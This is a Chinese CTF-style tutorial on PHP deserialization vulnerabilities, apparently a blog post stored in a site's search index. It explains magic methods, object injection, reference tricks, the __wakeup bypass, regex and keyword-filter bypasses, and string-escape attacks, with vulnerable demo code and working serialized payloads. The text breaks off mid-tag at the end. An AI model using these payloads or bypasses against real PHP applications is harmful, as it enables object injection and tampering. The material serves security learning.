<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php反序列化总结</title>
      <link href="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p><p>在反序列化的过程中自动触发了某些魔术方法。</p><p><strong>漏洞触发条件</strong>：unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法</p><p><strong>序列化demo</strong></p><pre><code class="php">&lt;?phpclass sakura&#123;    public $a=&#39;HY&#39;;    public $b=&#39;666&#39;;    public function __wakeup()&#123;        print $this-&gt;a+$this-&gt;b;    &#125;&#125;$a = new sakura();print (serialize($a));</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209165156822.png" alt="image-20221209165156822"></p><p><strong>序列化数据格式</strong></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209162056383.png" alt="image-20221209162056383"></p><h1 id="常用魔术方法总结"><a href="#常用魔术方法总结" class="headerlink" title="常用魔术方法总结"></a>常用魔术方法总结</h1><p>一、__construct(构造方法)</p><pre><code class="php">当类被实例化的时候就会调用简单来说，就是new一个类的时候，这个方法就会自动执行&lt;?phpclass autofelix &#123;    public function __construct()    &#123;        echo &#39;我是类autofelix&#39;;    &#125;&#125; new autofelix(); //即可输出:我是类autofelix123456789101112131415</code></pre><p>二、 __destruct(析构方法)</p><pre><code class="php">当类被销毁时候自动触发可以使用unset方法触发该方法&lt;?phpclass autofelix &#123;    public function __destruct()    &#123;        echo &#39;我准备销毁你了&#39;;    &#125;&#125; $a = new autofelix();unset($a); //即可输出:我准备销毁你了12345678910111213141516</code></pre><p>三、 __clone(克隆方法)</p><pre><code class="php">当类被克隆时自动会自动调用&lt;?phpclass autofelix &#123;    public function __clone()    &#123;        echo &#39;我克隆了你&#39;;    &#125;&#125; $a = new autofelix();clone $a; //即可输出:我克隆了你123456789101112131415</code></pre><p>四、__call(非静态调用方法)</p><pre><code class="php">当要调用的方法不存在或者权限不足时候会自动调用比如我在类的外部调用类内部的private修饰的方法&lt;?phpclass autofelix &#123;    private function say()     &#123;        echo &#39;hello, 我是autofelix&#39;;    &#125;     public function __call($name, $arguments)    &#123;        echo &#39;你无权调用&#39; . $name . &#39;方法&#39;;        die;    &#125;&#125; $a = new autofelix();$a-&gt;say(); //按理说应该报错 //即可输出:你无权调用say方法12345678910111213141516171819202122</code></pre><p>五、__callStatic(静态调用方法)</p><pre><code class="php">当要调用的静态方法不存在或者权限不足时候会自动调用比如我在类的外部调用类内部的private修饰的静态方法&lt;?phpclass autofelix &#123;    private static function say()     &#123;        echo &#39;hello, 我是autofelix&#39;;    &#125;     public function __callStatic($name, $arguments)    &#123;        echo &#39;你无权调用&#39; . $name . &#39;方法&#39;;        die;    &#125;&#125; $a = new autofelix();$a::say(); //按理说应该报错 //即可输出:你无权调用say方法12345678910111213141516171819202122</code></pre><p>六、__debugInfo(打印方法)</p><pre><code class="php">该方法会在var_dump()类对象时候被调用如果没有定义该方法，var_dump()将会打印出所有的类属性&lt;?phpclass autofelix &#123;    public function __debugInfo()    &#123;        echo &#39;你看不到我任何信息的~&#39;;    &#125;&#125; var_dump(new autofelix()); //即可输出:你看不到我任何信息的~123456789101112131415</code></pre><p>七、__get(获取成员属性方法)</p><pre><code class="php">通过它可以在对象外部获取私有成员属性&lt;?phpclass autofelix &#123;    private $name = &#39;autofelix&#39;;     public function __get($name)    &#123;        if(in_array($name, [&#39;name&#39;, &#39;age&#39;])) &#123;           echo $this-&gt;name;        &#125; else &#123;            echo &#39;不是什么东西都能访问的~&#39;;        &#125;    &#125;&#125; $a = new autofelix();$a-&gt;name; //即可输出:autofelix123456789101112131415161718192021</code></pre><p>八、__isset方法</p><pre><code class="php">当对不可访问的属性调用isset()或则会empty()时候会被自动调用&lt;?phpclass autofelix &#123;    private $name = &#39;autofelix&#39;;     public function __isset($name)    &#123;        if(in_array($name, [&#39;name&#39;, &#39;age&#39;])) &#123;           echo $this-&gt;name;        &#125; else &#123;            echo &#39;不是什么东西都能访问的~&#39;;        &#125;    &#125;&#125; $a = new autofelix();isset($a-&gt;name); //结果: autofelix123456789101112131415161718192021</code></pre><p>九、__set方法</p><pre><code class="php">给一个未定义的属性赋值时候会被触发&lt;?phpclass autofelix &#123;    public function __set($name, $value)    &#123;        echo &#39;你想给&#39; . $name . &#39;赋值&#39; . $value;    &#125;&#125; $a = new autofelix();$a-&gt;name = &#39;autofelix&#39;; //结果: 你想给name赋值autofelix;123456789101112131415</code></pre><p>十、__invoke方法</p><pre><code class="php">对象本身不能直接当函数用如果对象被当作函数调用就会触发该方法&lt;?phpclass autofelix &#123;    public function __invoke()    &#123;        echo &#39;你还想调用我?&#39;;    &#125;&#125; $a = new autofelix(); //对象直接当函数调用$a(); //结果: 你还想调用我?123456789101112131415161718</code></pre><p>十一、__sleep方法</p><pre><code class="php">当在类的外部调用serialize()时会自动被调用&lt;?phpclass autofelix &#123;    public function __sleep()    &#123;        echo &#39;弄啥嘞~&#39;;    &#125;&#125; $a = new autofelix(); serialize($a); //结果: 弄啥嘞~12345678910111213141516</code></pre><p>十二、__toString方法</p><pre><code class="php">当一个类被当作字符串处理时应该返回什么这里必须返回一个string类型不然会报致命错误&lt;?phpclass autofelix &#123;    public function __toString()    &#123;        return &#39;我是你得不到的对象...&#39;;    &#125;&#125; $a = new autofelix();echo $a; //结果: 我是你得不到的对象...12345678910111213141516</code></pre><p>十三、__unset方法</p><pre><code class="php">当对不可访问的属性调用unset()时会被自动调用&lt;?phpclass autofelix &#123;    private $name = &#39;autofelix&#39;;     public function __unset($name)    &#123;        echo &#39;想删我? 你也配?&#39;;    &#125;&#125; $a = new autofelix();unset($a-&gt;name); //结果: 想删我? 你也配?1234567891011121314151617</code></pre><p>十四、__wakeup方法</p><pre><code class="php">当执行unserialize()方法时会被自动调用&lt;?phpclass autofelix &#123;    public function __wakeup()    &#123;        echo &#39;又想弄啥嘞~&#39;;    &#125;&#125; $a = new autofelix(); unserialize($a); //结果: 又想弄啥嘞~12345678910111213141516</code></pre><h1 id="魔术方法的执行顺序"><a href="#魔术方法的执行顺序" class="headerlink" title="魔术方法的执行顺序"></a>魔术方法的执行顺序</h1><p>不同的魔术方法的执行顺序是不一样的，我们只需要搞清楚最开始会先执行什么，最后会执行什么就可以了</p><p>我们就来探讨下 <code>__construt</code>,<code>__wakeup</code>,<code>__destruct</code>这几个魔术方法的执行顺序</p><p><strong>首先我们来看一下new一个类的时候魔术方法的执行顺序</strong></p><pre><code class="php">&lt;?phpclass sakura&#123;    public $a=&#39;HY&#39;;    public $b=&#39;666&#39;;    public function __construct()&#123;        print &quot;这是__construct方法\r\n&quot;;    &#125;    public function __wakeup()&#123;        print &quot;这是__wakeup方法\r\n&quot;;    &#125;    public function __destruct()&#123;        print &quot;这是__destruct方法\r\n&quot;;    &#125;&#125;$a = new sakura();print (serialize($a).&quot;\r\n&quot;);</code></pre><p>运行一下</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209170709748.png" alt="image-20221209170709748"></p><p>​    这是我们序列化的过程</p><p>由于我们new了一个sakura类，所以会调用<code>__construct</code>方法,然后就会执行我们的print语句输出了序列化的值，最后new完以后这个类会被销毁所以会调用<code>__destruct方法</code></p><p><strong>同理，我们来看一下反序列化过程,demo如下</strong></p><pre><code class="php">&lt;?phpclass sakura&#123;    public $a=&#39;HY&#39;;    public $b=&#39;666&#39;;    public function __construct()&#123;        print &quot;这是__construct方法\r\n&quot;;    &#125;    public function __wakeup()&#123;        print &quot;这是__wakeup方法\r\n&quot;;    &#125;    public function __destruct()&#123;        print &quot;这是__destruct方法\r\n&quot;;    &#125;&#125;#$a = new sakura();#print (serialize($a).&quot;\r\n&quot;);$b = &#39;O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#39;;unserialize($b);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209171216201.png" alt="image-20221209171216201"></p><p>这里由于我们没有new一个对象的操作，所以就没有执行<code>__construct</code>方法</p><p>首先进行反序列化，<code>__wakeup</code>是当执行unserialize()方法时会被自动调用,所以是最先开始调用的</p><p>最后会对类进行销毁，所以会调用<code>__destruct方法</code></p><p>其他魔术方法的调用都必须在它们两个之间!</p><p>到这里基础知识就已经够了，接下来我们就来看一些反序列化在ctf中的常见考法</p><h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、<code>unserialize</code>的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><pre><code class="php">&lt;?phpclass A&#123;    var $test = &quot;ssss&quot;;    function __destruct()&#123;        echo $this-&gt;test;    &#125;&#125;$a = &#39;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;HY&quot;;&#125;&#39;;unserialize($a);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210172357978.png" alt="image-20221210172357978"></p><h1 id="指针引用"><a href="#指针引用" class="headerlink" title="指针引用"></a>指针引用</h1><p>在php反序列化中,r、R 分别表示对象引用和指针引用，在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。</p><p>在解释对象引用和指针引用之前，先让我们看几个例子</p><pre><code class="php">&lt;?phpclass SampleClass &#123;    var $value;&#125;$a = new SampleClass();$a-&gt;value = $a;$b = new SampleClass();$b-&gt;value = &amp;$b;echo serialize($a);echo &quot;\n&quot;;echo serialize($b);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209203846002.png" alt="image-20221209203846002"></p><p>我们发现,这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1</p><p>但是对象引用和指针引用到底有什么区别呢？让我们看下面这个例子</p><pre><code class="php">&lt;?phpclass SampleClass &#123;    var $value;&#125;$a = new SampleClass();$a-&gt;value = $a;$b = new SampleClass();$b-&gt;value = &amp;$b;$a-&gt;value = 1;$b-&gt;value = 1;var_dump($a);var_dump($b);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209204547992.png" alt="image-20221209204547992"></p><p>这表示，当我们改变<code>$a-&gt;value</code>的值时，仅仅改变了<code>$a-&gt;value</code>的值,但是当我们改变<code>$b-&gt;value</code>的值时，却改变了$b的本身</p><p>有时候这个考点会出现在ctf中，现在我们来讲解一个ctf题目</p><p><strong>ctf题目讲解</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class File &#123;    public $filename;    public $secret;    public function __construct($filename, $secret)&#123;            echo &quot;construct被调用&quot;;            echo $filename;            echo $secret;            $this -&gt; filename= $filename ;            $this-&gt;secret=$secret;&#125;public function __wakeup()&#123;            $this-&gt;filename=&quot;nonoflag&quot; ;            if(isset($_GET[&#39;secret&#39;]))&#123;            $this-&gt;secret= $_GET[&#39;secret&#39;]; &#125;&#125;public function __destruct()&#123;            echo &quot;destruct被调用&quot;;            printf($this-&gt;filename);            echo &quot;\n&quot;;&#125;&#125;$flag = $_GET[&#39;x&#39;];unserialize($flag);</code></pre><p>这题稍微改编了下，我们的目的就是让<code>$this-&gt;filename</code>最终等于<code>flag.php</code>,而这题的前提条件又是php的版本较高，无法使用fast destruct的情况</p><p>我们先假装不知道不能用fast destruct</p><p>首先正常构造一个反序列化</p><pre><code class="php">&lt;?phpclass File &#123;    public $filename;    public $secret;&#125;$a = new File();$a-&gt;filename=&#39;flag.php&#39;;print serialize($a);//O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;&#125;</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233516920.png" alt="image-20221209233516920"></p><p>如图，由于<code>__wakeup</code>魔术方法的存在<code>$filename</code>从我们传入的<code>flag.php</code>变为了<code>nonoflag</code>,然后尝试使用fast destruct</p><pre><code class="php">O:4:&quot;File&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;&#125;O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:6:&quot;secret&quot;;N;</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233659929.png" alt="image-20221209233659929"></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233712131.png" alt="image-20221209233712131"></p><p>如上图，最终都失败了，所以我们要尝试看有没有其它办法,由于这里并不止<code>filename</code>一个变量,而且<code>__wakeup</code>里有这样一行代码</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209234010104.png" alt="image-20221209234010104"></p><p>是不是觉得很眼熟,由此我们可以尝试引入我们上文讲的指针引用</p><p>构造payload如下:</p><pre><code class="php">&lt;?phpclass File &#123;    public $filename;    public $secret;&#125;$a = new File();$a-&gt;filename=&#39;HY&#39;;$a-&gt;filename=&amp;$a-&gt;secret;print serialize($a);// O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</code></pre><p>然后反序列化的同时给<code>secret</code>传入<code>flag.php</code></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210000052881.png" alt="image-20221210000052881"></p><p>神奇的事情发生了，<code>filename</code>的值成功变为<code>flag.php</code>了</p><p>整个流程是这样的:</p><p>我们给<code>filename</code>随意赋值为<code>HY</code>,然后使用一个指针引用。当反序列化的时候，调用<code>__wakeup</code>魔术方法,<code>filename</code>被赋值为了<code>nonoflag</code>,但是它下一步的时候,<code>secret</code>参数就接收了我们传入的<code>flag.php</code>,由于指针引用的关系,<code>filename</code>也跟着<code>secret</code>变为了<code>flag.php</code></p><h1 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h1><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p><ol><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>serialize(array( a ) ) ; / / a));// a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li></ol><pre><code class="php">&lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#39;abc&#39;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a.PHP_EOL;    &#125;&#125;function match($data)&#123;    if (preg_match(&#39;/^O:\d+/&#39;,$data))&#123;        die(&#39;you lose!&#39;);    &#125;else&#123;        return $data;    &#125;&#125;$a = &#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;;// +号绕过$b = str_replace(&#39;O:4&#39;,&#39;O:+4&#39;, $a);unserialize(match($b));// serialize(array($a));unserialize(&#39;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#39;);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010008949.png" alt="image-20221210010008949"></p><h1 id="fast-destruct-绕过-wakeup"><a href="#fast-destruct-绕过-wakeup" class="headerlink" title="fast destruct(绕过__wakeup)"></a>fast destruct(绕过__wakeup)</h1><p>今天介绍的这个技巧被称为<code>fast destruct</code>，可以在<code>unserialize</code>函数执行完后，立即触发我们的poc,这样就可以绕过一些限制，如<code>__wakeup</code>魔术方法</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209200143603.png" alt="image-20221209200143603"></p><ul><li>存在漏洞的PHP版本: PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li>漏洞概述: <code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li>漏洞原理: <code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code> </li></ul><p>我这里用 phpstudy+php7.0.9来复现这个漏洞</p><p>我们来写一个demo</p><pre><code class="php">&lt;?phpclass sakura&#123;    public $a=&#39;HY&#39;;    public $b=&#39;666&#39;;    public function __construct()&#123;        print &quot;这是__construct方法\r\n&quot;;    &#125;    public function __wakeup()&#123;        print &quot;这是__wakeup方法\r\n&quot;;    &#125;    public function __destruct()&#123;        print &quot;这是__destruct方法\r\n&quot;;    &#125;&#125;#$a = new sakura();#print (serialize($a).&quot;\r\n&quot;);$b = &#39;O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#39;;unserialize($b);</code></pre><p>正常反序列化过程:</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201038411.png" alt="image-20221209201038411"></p><p><strong>1.修改序列化数字元素个数</strong></p><pre><code class="php">O:6:&quot;sakura&quot;:3:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;  //我这里讲2改为了3</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201155305.png" alt="image-20221209201155305"></p><p>我们发现只执行了<code>__destruct</code>方法，而没有执行<code>__wakeup</code>方法，成功绕过了<code>__wakeup</code>魔术方法的执行</p><p><strong>2.去掉序列化尾部 }</strong></p><pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;HY&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;</code></pre><p>我在windows上复现失败了，不过这种方法是可行的，就不再复现了</p><h1 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h1><p>在序列化的时候:如果变量前是protected，则是\x00*\x00变量名的形式,如果变量前是private,则是\x00类名\x00的形式</p><pre><code class="php">&lt;?phpclass test&#123;    protected $a;    private $b;    public function __construct()&#123;        $this-&gt;a = &#39;abc&#39;;        $this-&gt;b=  &#39;def&#39;;    &#125;    public function  __destruct()&#123;        echo &quot;\n&quot;;        echo $this-&gt;a;        echo $this-&gt;b;    &#125;&#125;$a = new test();echo serialize($a);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210004733397.png" alt="image-20221210004733397"></p><p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p><pre><code class="php">&lt;?phpclass test&#123;    protected $a;    public function __construct()&#123;        $this-&gt;a = &#39;abc&#39;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code></pre><h1 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h1><pre><code class="php">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;可以写成O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;表示字符类型的s大写时，会被当成16进制解析。</code></pre><p>这里写了一个例子:</p><pre><code class="php">&lt;?phpclass test&#123;    public $username;    public function __construct()&#123;        $this-&gt;username = &#39;admin&#39;;    &#125;    public function  __destruct()&#123;        echo 666;    &#125;&#125;function check($data)&#123;    if(stristr($data, &#39;username&#39;)!==False)&#123;        echo(&quot;你绕不过！！&quot;.PHP_EOL);    &#125;    else&#123;        return $data;    &#125;&#125;// 未作处理前$a = &#39;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#39;;$a = check($a);unserialize($a);// 做处理后 \75是u的16进制$a = &#39;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#39;;$a = check($a);unserialize($a);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010741617.png" alt="image-20221210010741617"></p><p>如图，处理后成功的绕过了!</p><h1 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h1><p>一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变。其主要原理就是运用闭合的思想。</p><p>示例代码:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);class sakura&#123;    public $name=&#39;HY&#39;;    public $age=&#39;25&#39;;&#125;$a = new sakura();$a = serialize($a);print ($a);var_dump(unserialize($a));</code></pre><p>运行这段代码,我们可以得到这个类正常序列化的值，和它反序列化的内容</p><pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;class sakura#1 (2) &#123;  public $name =&gt;  string(2) &quot;HY&quot;  public $age =&gt;  string(2) &quot;25&quot;&#125;</code></pre><p>但是我们可以在反序列化时，对其值做一些手脚,如果我们对这样一个序列化值进行反序列化会发生什么呢?</p><pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;123</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013324096.png" alt="image-20221210013324096"></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210012901305.png" alt="image-20221210012901305"></p><p>我们发现并没有什么改变，说明{}是字符串反序列化时的分界符，在进行反序列化时，是从左到右读取。读取多少取决于s后面的字符长度</p><p>比如当我们将数字改成5</p><pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:5:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013348276.png" alt="image-20221210013348276"></p><p>此时在读取name时，它会将闭合的双引号也读取在内，而需要闭合字符串的双引号被当作字符串处理，这时就会导致语法错误而报错。</p><p>一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变，其主要原理就是运用闭合的思想。</p><p>字符逃逸主要有两种，一种是字符增多，一种是字符减少。</p><p><strong>1.过滤后字符变多</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);class sakura&#123;    public $name;    public $age=&#39;25&#39;;    function __destruct()&#123;        print $this-&gt;age;    &#125;&#125;function change($str)&#123;    return str_replace(&quot;H&quot;,&quot;HH&quot;,$str);&#125;$a = new sakura();$a-&gt;name=$_GET[&#39;x&#39;];$str=serialize($a);print &quot;过滤前: &quot;.&quot;\n&quot;;print $str;print &quot;  逃逸前sakura的年龄为:  &quot;;unset($a);$str=change($str);print &quot;  过滤后:&quot;.&quot;\n&quot;;print $str.&quot;\n&quot;;print &quot;过滤后sakura的年龄为:&quot;;unserialize($str);</code></pre><p>我们先随意传入一个名字</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014745476.png" alt="image-20221210014745476"></p><p>如果我们传入带有H的名字会怎么样呢?</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014915564.png" alt="image-20221210014915564"></p><p>我们可以发现名字由 HY变为了 HHY</p><p>我们输入很多H呢?</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015149828.png" alt="image-20221210015149828"></p><p>神奇的事情发生了,过滤后的序列化字符串名字长度仍然是9,但是实际上它的长度早已经超过9了,所以我们就可以利用这点来构造字符串逃逸</p><p>我们首先要想，我们需要把他构造成什么样的形式,我们的目的是要修改age的值，而我们的输入点在name处</p><pre><code class="php">&quot;;s:3:&quot;age&quot;;s:2:&quot;99&quot;;&#125;</code></pre><p>这些是我们需要传入的,但是我们还要计算下它有多长，然后选择合适的H的个数去逃逸它</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015919846.png" alt="image-20221210015919846"></p><p>我们需要逃逸22个字符，每多一个H我们可以逃逸一个字符，所以我们需要22个H，由此我们可以传入</p><pre><code class="php">HHHHHHHHHHHHHHHHHHHHHH&quot;;s:3:&quot;age&quot;;s:2:&quot;99&quot;;&#125;</code></pre><p>我们来看看效果</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020543648.png" alt="image-20221210020543648"></p><p>我们成功完成了字符串逃逸，改变了age的值！</p><p><strong>2.过滤后字符变少</strong></p><p>这个原理其实也差不多，我们直接上代码</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);class sakura&#123;    public $name;    public $age=&#39;25&#39;;    function __destruct()&#123;        print $this-&gt;age;    &#125;&#125;function change($str)&#123;    return str_replace(&quot;HH&quot;,&quot;H&quot;,$str);&#125;$a = new sakura();$a-&gt;name=$_GET[&#39;x&#39;];$str=serialize($a);print &quot;过滤前: &quot;.&quot;\n&quot;;print $str;print &quot;  逃逸前sakura的年龄为:  &quot;;unset($a);$str=change($str);print &quot;  过滤后:&quot;.&quot;\n&quot;;print $str.&quot;\n&quot;;print &quot;过滤后sakura的年龄为:&quot;;unserialize($str);</code></pre><p>也就是每输入两个HH就会变为一个H</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020923726.png" alt="image-20221210020923726"></p><p>但是原理是有所不同的，字符增加主要是使s包含的范围被我们的垃圾字符填充，然后会继续反序列化我们恶意的字符串,由于它本来带的那部分序列化内容被我们用}截断，所以并没有起效果</p><p>而这个字符串减少的字符串逃逸，我们可以发现，s的范围是大于我们的名字的，所以我们需要让s的范围包含完本来的字符串，这样我们的恶意字符串就得以执行</p><p>为了更好的理解题目，我们稍微修改一下代码:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);class sakura&#123;    public $name=&#39;HY&#39;;    public $age=&#39;25&#39;;    function __destruct()&#123;        print $this-&gt;age;    &#125;&#125;function change($str)&#123;    return str_replace(&quot;HH&quot;,&quot;H&quot;,$str);&#125;$a = new sakura();$str = serialize($a);echo $str;echo &quot;\n&quot;;print &quot;改变前sakura的年龄为:&quot;;unset($a);echo &quot;\n&quot;;$str = change($str);print $str;echo &quot;\n&quot;;print &quot;改变后sakura的年龄为:&quot;;unserialize($str);</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165137214.png" alt="image-20221210165137214"></p><pre><code 